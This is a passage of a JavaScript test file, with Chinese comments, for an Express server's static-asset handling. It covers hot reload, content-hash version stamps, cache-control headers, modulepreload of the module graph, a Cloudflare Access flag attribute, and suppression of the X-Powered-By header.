  // app/public/js 下【除 app.js 外的全部子模块】从"逐请求读盘"变成了启动冻结（index.html 与
  // app.js 本来就是启动读的，子模块不是）。而 `npm run dev` 的 node --watch 只监视被 import
  // 的模块，app/public/js/** 不在服务端的 import 图里 → 改完刷新拿到的还是旧代码、且零提示。
  test('hotReloadJs：开发期逐请求读盘，改完刷新即生效（且相对 import 照样戳版本）', () => {
    const { root, run } = mount({ hotReloadJs: true });
    writeFileSync(
      join(root, 'app/public/js/app/sub.js'),
      "import { esc } from '../logic.js';\nexport const BUILD = 'edited-after-boot';\n",
    );

    const out = run('/js/app/sub.js');
    assert.equal(out.status, 200);
    assert.match(out.body, /BUILD = 'edited-after-boot'/, '开发期还在发启动时那份');
    assert.match(out.body, /from '\.\.\/logic\.js\?v=[0-9a-f]{8}'/, '热读路径漏了 ?v= 改写会造出双实例');
  });

  test('hotReloadJs：启动后新建的子模块也能取到（生产走表、这里走盘）', () => {
    const { root, run } = mount({ hotReloadJs: true });
    writeFileSync(join(root, 'app/public/js/app/born-later.js'), "export const N = 1;\n");

    const out = run('/js/app/born-later.js');
    assert.equal(out.status, 200);
    assert.match(out.body, /export const N = 1/);
    assert.equal(out.nextCalled, false);
  });

  test('hotReloadJs：读不到仍旧交给 static，不把异常抛进请求链', () => {
    assert.equal(mount({ hotReloadJs: true }).run('/js/never-existed.js').nextCalled, true);
  });

  // 判据必须是专用开关，不能是 DEV_MODE：真实生产 .env 里 DEV_MODE=1（.env.example 明确说
  // dogfooding 常驻部署可以开），复用它等于在生产把启动预读悄悄撤回去。
  test('默认档跟随 ASSET_HOT_RELOAD，且不受 DEV_MODE 影响', () => {
    const saved = { hot: process.env.ASSET_HOT_RELOAD, dev: process.env.DEV_MODE };
    const bodyOf = () => {
      const { root, run } = mount(); // 不传 hotReloadJs → 走默认推导
      writeFileSync(join(root, 'app/public/js/app/sub.js'), "export const BUILD = 'edited-after-boot';\n");
      return run('/js/app/sub.js').body;
    };
    try {
      process.env.DEV_MODE = '1';
      delete process.env.ASSET_HOT_RELOAD;
      assert.match(bodyOf(), /BUILD = 'startup'/, 'DEV_MODE 不该打开静态资源热读');

      process.env.ASSET_HOT_RELOAD = '1';
      assert.match(bodyOf(), /BUILD = 'edited-after-boot'/, 'ASSET_HOT_RELOAD=1 应打开热读');
    } finally {
      if (saved.hot === undefined) delete process.env.ASSET_HOT_RELOAD; else process.env.ASSET_HOT_RELOAD = saved.hot;
      if (saved.dev === undefined) delete process.env.DEV_MODE; else process.env.DEV_MODE = saved.dev;
    }
  });
});

// vendor/ 的内容必须真的进版本哈希——只让正则认得 /vendor/ 前缀而不把文件内容算进 assetVersion，
// 效果等于给了一个永远不变的 ?v=，跟没有 immutable 失效手段没有区别（regex 测试那条能测出"格式
// 对不对"，测不出"值会不会随内容变"，这条补上）。
test.describe('configureHttpShell：vendor/ 的内容变化必须改变 assetVersion', () => {
  const roots = [];
  test.after(() => { for (const dir of roots) rmSync(dir, { recursive: true, force: true }); });

  // 每次都建一棵全新的最小 fixture（index.html + js/app.js + vendor/<name>），
  // vendorContent 是唯一变量，其余文件内容两次调用完全一致。
  function assetVersionFor(vendorContent) {
    const root = mkdtempSync(join(tmpdir(), 'ccm-http-vendor-'));
    roots.push(root);
    mkdirSync(join(root, 'app/public/js/app'), { recursive: true });
    mkdirSync(join(root, 'app/public/vendor'), { recursive: true });
    writeFileSync(join(root, 'app/public/index.html'),
      '<body><script src="/js/app.js"></script><script src="/vendor/fake-lib.js"></script></body>');
    writeFileSync(join(root, 'app/public/js/app.js'), "console.log('app');\n");
    writeFileSync(join(root, 'app/public/vendor/fake-lib.js'), vendorContent);

    const routes = new Map();
    const app = { use: () => {}, get: (p, ...h) => routes.set(String(p), h), disable: () => {} };
    configureHttpShell({ app, projectRoot: root, strategy: strategyStub(), hotReloadJs: false });
    const indexHandlers = routes.get(String(['/', '/index.html']));
    const out = { body: null };
    indexHandlers[indexHandlers.length - 1]({}, { setHeader: () => {}, type: () => ({ send: b => { out.body = b; } }) });
    const m = out.body.match(/\/vendor\/fake-lib\.js\?v=([0-9a-f]{8})/);
    assert.ok(m, `index.html 里的 vendor 脚本引用应该带上 ?v=，实际：${out.body}`);
    return m[1];
  }

  test('同内容两次调用得到相同版本号（确定性、非随机戳）', () => {
    assert.equal(assetVersionFor("console.log('v1');\n"), assetVersionFor("console.log('v1');\n"));
  });

  test('vendor 文件内容一变，版本号跟着变——否则 immutable 缓存的浏览器永远不会取新版本', () => {
    const before = assetVersionFor("console.log('v1');\n");
    const after = assetVersionFor("console.log('v2 — 库升级了');\n");
    assert.notEqual(before, after);
  });
});

// 一方资源（/js、/css、/vendor）的缓存头：URL 里的 ?v= 就是内容版本，等于当前版本戳的那份内容不会再变，
// 可以让浏览器一年内不回源；其余一律 no-cache，交给 304 重验。走真 express + 真监听端口，因为缓存头要在
// 响应真正写出时按最终状态码定，假 res 桩看不见这一步。
test.describe('configureHttpShell：只有带当前版本戳的一方资源才按 immutable 缓存', () => {
  const IMMUTABLE = 'public, max-age=31536000, immutable';
  const ASSETS = ['/js/app.js', '/js/app/sub.js', '/css/app.css', '/css/tw.css', '/vendor/lib.js', '/vendor/font.woff2'];
  // app.css 用 @font-face 引 vendor 里的字体：三种合法的 url() 引号写法各一条，外加一条已带 query 的
  const FONT_FACES = [
    '@font-face{font-family:A;src:url(/vendor/font.woff2) format("woff2")}',
    '@font-face{font-family:B;src:url("/vendor/font.woff2") format("woff2")}',
    "@font-face{font-family:C;src:url('/vendor/font.woff2') format(\"woff2\")}",
    '@font-face{font-family:D;src:url(/vendor/font.woff2?v=keep) format("woff2")}',
  ].join('\n');
  const roots = [];
  const servers = [];
  test.after(async () => {
    for (const server of servers) { server.closeAllConnections(); await new Promise(resolve => server.close(resolve)); }
    for (const dir of roots) rmSync(dir, { recursive: true, force: true });
  });

  async function boot({ hotReloadJs = false, beforeStart = () => {} } = {}) {
    const root = mkdtempSync(join(tmpdir(), 'ccm-http-cache-'));
    roots.push(root);
    const pub = join(root, 'app/public');
    for (const dir of ['js/app', 'css', 'vendor']) mkdirSync(join(pub, dir), { recursive: true });
    writeFileSync(join(pub, 'index.html'), [
      '<body >',
      '<link rel="stylesheet" href="/css/app.css"><link rel="stylesheet" href="/css/tw.css">',
      '<script src="/vendor/lib.js"></script><script type="module" src="/js/app.js"></script>',
      '</body>',
    ].join(''));
    writeFileSync(join(pub, 'js/app.js'), "import { SUB } from './app/sub.js';\nconsole.log(SUB);\n");
    writeFileSync(join(pub, 'js/app/sub.js'), 'export const SUB = 1;\n');
    writeFileSync(join(pub, 'css/app.css'), `${FONT_FACES}\nbody{}\n`);
    writeFileSync(join(pub, 'css/tw.css'), '.tw{}\n');
    writeFileSync(join(pub, 'vendor/lib.js'), 'window.LIB = 1;\n');
    writeFileSync(join(pub, 'vendor/font.woff2'), 'wOF2-font-v1');
    beforeStart(pub);
    const app = express();
    configureHttpShell({ app, projectRoot: root, strategy: strategyStub(), hotReloadJs });
    const server = app.listen(0, '127.0.0.1');
    await once(server, 'listening');
    servers.push(server);
    const base = `http://127.0.0.1:${server.address().port}`;
    const get = (path, headers = {}) => fetch(base + path, { headers });
    const versionOf = async () => {
      const html = await (await get('/')).text();
      const m = html.match(/\/js\/app\.js\?v=([0-9a-f]{8})/);
      assert.ok(m, `index 里的 app.js 没戳版本：${html}`);
      return m[1];
    };
    return { pub, get, versionOf };
  }

  test('?v= 等于当前版本戳 → 一年 immutable；没带或带旧戳 → no-cache', async () => {
    const { get, versionOf } = await boot();
    const v = await versionOf();
    for (const path of ASSETS) {
      const hit = await get(`${path}?v=${v}`);
      assert.equal(hit.status, 200, path);
      assert.equal(hit.headers.get('cache-control'), IMMUTABLE, `${path}?v=当前戳却没给 immutable：二次启动仍要逐个 304 重验`);
      for (const miss of [path, `${path}?v=00000000`]) {
        const res = await get(miss);
        assert.equal(res.status, 200, miss);
        assert.equal(res.headers.get('cache-control'), 'no-cache', `${miss} 不是当前版本的 URL，给长缓存会让浏览器一年拿不到新内容`);
      }
    }
  });

  test('带当前版本戳的失败响应不得 immutable：404 被存一年，文件补上后浏览器也看不到', async () => {
    const { get, versionOf } = await boot();
    const v = await versionOf();
    for (const path of ['/js/missing.js', '/js/app/missing.js', '/css/missing.css', '/vendor/missing.js']) {
      const res = await get(`${path}?v=${v}`);
      assert.equal(res.status, 404, path);
      assert.notEqual(res.headers.get('cache-control'), IMMUTABLE, path);
    }
    const ranged = await get(`/vendor/lib.js?v=${v}`, { range: 'bytes=999-' });
    assert.equal(ranged.status, 416);
    assert.notEqual(ranged.headers.get('cache-control'), IMMUTABLE, '416 也是失败响应');
  });

  // 304 = 浏览器手里那份就是当前版本。回 no-cache 会把已存的条目降级成每次都重验，等于没做。
  test('当前版本戳的 304 重验同样回 immutable', async () => {
    const { get, versionOf } = await boot();
    const v = await versionOf();
    for (const path of ASSETS) {
      const etag = (await get(`${path}?v=${v}`)).headers.get('etag');
      assert.ok(etag, `${path} 没有 ETag，没法测 304`);
      // 显式给 cache-control：fetch 见到 if-none-match 会自己补一个 no-cache，服务端就不回 304 了。
      // max-age=0 是浏览器普通刷新时重验发的那个值。
      const res = await get(`${path}?v=${v}`, { 'if-none-match': etag, 'cache-control': 'max-age=0' });
      assert.equal(res.status, 304, path);
      assert.equal(res.headers.get('cache-control'), IMMUTABLE, path);
    }
  });

  test('index 与 sw.js 仍恒回源（no-store），不因版本戳规则被放进长缓存', async () => {
    const { pub, get } = await boot();
    writeFileSync(join(pub, 'sw.js'), 'self.addEventListener("push", () => {});\n');
    for (const path of ['/', '/index.html', '/sw.js']) {
      const res = await get(path);
      assert.equal(res.status, 200, path);
      assert.equal(res.headers.get('cache-control'), 'no-store', path);
    }
  });

  // css/ 下除了 app.css 还有 Tailwind 预编译出的 tw.css；它被 immutable 缓存后，?v= 是它唯一的失效手段。
  test('css/ 下任一文件内容一变，版本戳跟着变（不止 app.css）', async () => {
    const base = await (await boot()).versionOf();
    assert.equal(await (await boot()).versionOf(), base, '同内容两棵树的版本戳应相同');
    const tw = await boot({ beforeStart: pub => writeFileSync(join(pub, 'css/tw.css'), '.tw{color:red}\n') });
    assert.notEqual(await tw.versionOf(), base, '只改 tw.css 时版本戳没变：浏览器会按旧 URL 继续用一年');
  });

  // 字体由 app.css 里的 url() 引用，不经过 index。不给它戳版本，它就永远落在 no-cache，每次热启动都要 304，
  // font-display:swap 下还会先闪一下回退字体（2a 之前生产对 /vendor 一律 immutable，所以这是回归）。
  test('app.css 里 url(/vendor/…) 的字体引用戳上当前版本戳，该 URL 拿到 immutable', async () => {
    const { get, versionOf } = await boot();
    const v = await versionOf();
    const css = await (await get(`/css/app.css?v=${v}`)).text();
    for (const ref of [`url(/vendor/font.woff2?v=${v})`, `url("/vendor/font.woff2?v=${v}")`, `url('/vendor/font.woff2?v=${v}')`]) {
      assert.ok(css.includes(ref), `app.css 里缺 ${ref}：\n${css}`);
    }
    assert.doesNotMatch(css, /font\.woff2['"]?\)/, '还有没戳版本的字体引用');
    assert.ok(css.includes('url(/vendor/font.woff2?v=keep)'), '已带 query 的引用不该被再追加一个 ?v=');
    assert.equal((await get(`/vendor/font.woff2?v=${v}`)).headers.get('cache-control'), IMMUTABLE);
  });

  test('vendor/ 下的字体内容一变，版本戳跟着变（不止 .js/.css）', async () => {
    const base = await (await boot()).versionOf();
    const changed = await boot({ beforeStart: pub => writeFileSync(join(pub, 'vendor/font.woff2'), 'wOF2-font-v2') });
    assert.notEqual(await changed.versionOf(), base, '换了字体版本戳没变：浏览器会按旧 URL 继续用一年');
  });

  // 生产配置开着 ASSET_HOT_RELOAD：改了前端不重启，index 是 no-store 每次都会重新拿，
  // 只要它带出新戳，浏览器就会按新 URL 取新内容；戳不变则旧 URL 下的 immutable 缓存一年不失效。
  test('热读档：改前端文件后，下一次请求 index 就换新版本戳，子模块 import 与缓存判据跟着换', async () => {
    const { pub, get, versionOf } = await boot({ hotReloadJs: true });
    const oldV = await versionOf();
    writeFileSync(join(pub, 'js/app/sub.js'), 'export const SUB = 2;\n');
    const newV = await versionOf();
    assert.notEqual(newV, oldV, '热读档改了子模块，index 里的版本戳没变');
    const app = await (await get(`/js/app.js?v=${newV}`)).text();
    assert.match(app, new RegExp(`from '\\./app/sub\\.js\\?v=${newV}'`), 'app.js 的 import 还指着旧戳');
    assert.ok((await (await get(`/css/app.css?v=${newV}`)).text()).includes(`url(/vendor/font.woff2?v=${newV})`),
      'app.css 里的字体引用还指着旧戳');
    assert.equal((await get(`/js/app/sub.js?v=${newV}`)).headers.get('cache-control'), IMMUTABLE);
    assert.equal((await get(`/js/app/sub.js?v=${oldV}`)).headers.get('cache-control'), 'no-cache',
      '旧戳 URL 现在发的是新内容，再给 immutable 就是把新内容存进旧 URL');
  });
});

// 浏览器只有拿到一个模块、解析完它的 import 才知道下一层要什么：app.js → app/*.js → 再下一层，冷启动
// （首次打开、升级后）就是一波接一波的往返。index 的 head 里把整张图预先列成 modulepreload，几波压成一波。
// 判据从浏览器那一侧看：顺着【实际下发的】源码里的 import 爬，爬到的每个 URL 都得在预载里、一字不差
// （差一个 ?v= 就是另一个模块，预载白下、实际照样再下一次），预载里也不能多出图外的东西。
test.describe('configureHttpShell：index 的 head 里预载整张模块图（modulepreload）', () => {
  const IMMUTABLE = 'public, max-age=31536000, immutable';
  const roots = [];
  const servers = [];
  test.after(async () => {
    for (const server of servers) { server.closeAllConnections(); await new Promise(resolve => server.close(resolve)); }
    for (const dir of roots) rmSync(dir, { recursive: true, force: true });
  });

  async function boot({ hotReloadJs = false } = {}) {
    const root = mkdtempSync(join(tmpdir(), 'ccm-http-preload-'));
    roots.push(root);
    const pub = join(root, 'app/public');
    for (const dir of ['js/app', 'js/logic', 'css', 'vendor']) mkdirSync(join(pub, dir), { recursive: true });
    writeFileSync(join(pub, 'index.html'), [
      '<html><head><script src="/js/theme-boot.js"></script></head>',
      '<body ><script type="module" src="/js/app.js"></script></body></html>',
    ].join('\n'));
    // 四层：app.js → app/a.js、logic.js → app/b.js（a.js 还重复引 ../logic.js）→ logic/deep.js（经 ../ 跨目录）
    writeFileSync(join(pub, 'js/app.js'), "import { A } from './app/a.js';\nimport { L } from './logic.js';\nconsole.log(A, L);\n");
    writeFileSync(join(pub, 'js/app/a.js'), "import { B } from './b.js';\nexport { L } from '../logic.js';\nexport const A = B;\n");
    writeFileSync(join(pub, 'js/app/b.js'), "import { D } from '../logic/deep.js';\nexport const B = D;\n");
    writeFileSync(join(pub, 'js/logic.js'), 'export const L = 1;\n');
    writeFileSync(join(pub, 'js/logic/deep.js'), 'export const D = 1;\n');
    writeFileSync(join(pub, 'js/orphan.js'), 'export const O = 1;\n'); // 图外的模块
    writeFileSync(join(pub, 'js/theme-boot.js'), 'document.documentElement.dataset.t = "x";\n'); // 经典脚本
    const app = express();
    configureHttpShell({ app, projectRoot: root, strategy: strategyStub(), hotReloadJs });
    const server = app.listen(0, '127.0.0.1');
    await once(server, 'listening');
    servers.push(server);
    const base = `http://127.0.0.1:${server.address().port}`;
    const get = path => fetch(base + path);
    const preloadsOf = async () => {
      const html = await (await get('/')).text();
      const headEnd = html.indexOf('</head>');
      const links = [...html.matchAll(/<link rel="modulepreload" href="([^"]+)">/g)];
      for (const m of links) assert.ok(m.index < headEnd, `${m[1]} 的预载不在 head 里，浏览器读到它时 head 早过了`);
      const entry = html.match(/<script type="module" src="([^"]+)">/)[1];
      return { hrefs: links.map(m => m[1]), entry };
    };
    // 浏览器视角的模块图：从入口 URL 起，按下发源码里的 import 说明符相对当前 URL 解析
    const crawl = async entry => {
      const seen = new Set([entry]);
      for (const url of seen) {
        const res = await get(url);
        assert.equal(res.status, 200, url);
        const source = await res.text();
        for (const [, spec] of source.matchAll(/from\s+['"]([^'"]+)['"]/g)) {
          const dep = new URL(spec, base + url);
          seen.add(dep.pathname + dep.search);
        }
      }
      return seen;
    };
    return { pub, get, preloadsOf, crawl };
  }

  test('预载集合 = 从入口顺着实际 import 爬到的 URL 集合，逐个带当前版本戳；图外模块与经典脚本不预载', async () => {
    const { get, preloadsOf, crawl } = await boot();
    const { hrefs, entry } = await preloadsOf();
    const graph = await crawl(entry);
    assert.equal(graph.size, 5, `夹具的模块图应是 5 个：${[...graph]}`);
    assert.deepEqual([...hrefs].sort(), [...graph].sort(), '预载与浏览器实际要下的模块对不上');
    assert.equal(new Set(hrefs).size, hrefs.length, '同一模块预载了不止一次');
    for (const href of hrefs) {
      assert.doesNotMatch(href, /orphan|theme-boot/, `${href} 不在模块图里`);
      assert.equal((await get(href)).headers.get('cache-control'), IMMUTABLE, `${href} 没拿到 immutable：版本戳不是当前的`);
    }
  });

  // 生产配置开着 ASSET_HOT_RELOAD：改了前端不重启，新加的模块下一次打开就该在预载里，否则又退回多一波往返
  test('热读档：新加一条 import 后，下一次请求 index 的预载就跟上新图与新版本戳', async () => {
    const { pub, preloadsOf, crawl } = await boot({ hotReloadJs: true });
    const before = await preloadsOf();
    writeFileSync(join(pub, 'js/app/c.js'), 'export const C = 1;\n');
    writeFileSync(join(pub, 'js/app/b.js'), "import { D } from '../logic/deep.js';\nimport { C } from './c.js';\nexport const B = D + C;\n");
    const after = await preloadsOf();
    assert.ok(after.hrefs.some(href => href.startsWith('/js/app/c.js?v=')), `新模块 app/c.js 不在预载里：${after.hrefs}`);
    assert.notEqual(after.entry, before.entry, '改了模块，入口的版本戳没变');
    assert.deepEqual([...after.hrefs].sort(), [...await crawl(after.entry)].sort());
  });
});

// 2026-09-06 容器演练：index.html 的 <body> 自带 data-cf-access="0"（静态壳离线也要有确定值），此前服务端启用
// Access 时是往 body 前面再插一个 ="1"，页面上同名属性出现两次，全靠 HTML 解析器「取第一个」才成立——
// 属性顺序一换就静默翻成 0，而 0 的含义是「非 CF 拓扑」，公网用户令牌失效后会被送去错误的那扇门。
test('injectCfAccessFlag：改写既有属性值而不是再插一个，body 上同名属性恰好出现一次', () => {
  const html = '<html><body data-cf-access="0" class="h-full"><div data-cf-access="0"></div></body></html>';
  const on = injectCfAccessFlag(html, true);
  const bodyTag = on.match(/<body[^>]*>/)[0];
  assert.equal((bodyTag.match(/data-cf-access=/g) || []).length, 1, 'body 上同名属性不止一个，正确性只剩解析器取首个这一根稻草');
  assert.match(on, /<body data-cf-access="1" class="h-full">/);
  assert.match(on, /<div data-cf-access="0">/, 'body 之外的同名属性不该被碰');
  assert.match(injectCfAccessFlag(html, false), /<body data-cf-access="0" class="h-full">/);
  // 没有预置属性的壳也要能注入（失败方向必须有门可弹：缺属性 = token 门）
  assert.equal(injectCfAccessFlag('<body class="x">', true), '<body data-cf-access="1" class="x">');
});

// 2026-09-06 容器黑盒探测：响应头里 `X-Powered-By: Express` 在裸奔——对使用者零价值，对扫描器等于
// 「按 Express 的已知漏洞选武器」。它只能在 app 级关：Express 是在路由响应时才加这个头，而
// setSecurityHeaders 跑在中间件早期，那时头还不存在，res.removeHeader 抓不到（写成那样是永远绿的假修）。
test('configureHttpShell 关掉 X-Powered-By：不向扫描器自报技术栈', () => {
  const root = mkdtempSync(join(tmpdir(), 'ccm-http-xpb-'));
  try {
    mkdirSync(join(root, 'app/public/js/app'), { recursive: true });
    writeFileSync(join(root, 'app/public/index.html'), '<body ></body>');
    writeFileSync(join(root, 'app/public/js/app.js'), 'export const A = 1;\n');
    const disabled = [];
    const app = { use: () => {}, get: () => {}, disable: (k) => disabled.push(k) };
    configureHttpShell({ app, projectRoot: root, strategy: strategyStub() });
    assert.ok(
      disabled.includes('x-powered-by'),
      'X-Powered-By 仍会随每个响应自报 Express 版本栈——扫描器据此挑现成的 Express 漏洞',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
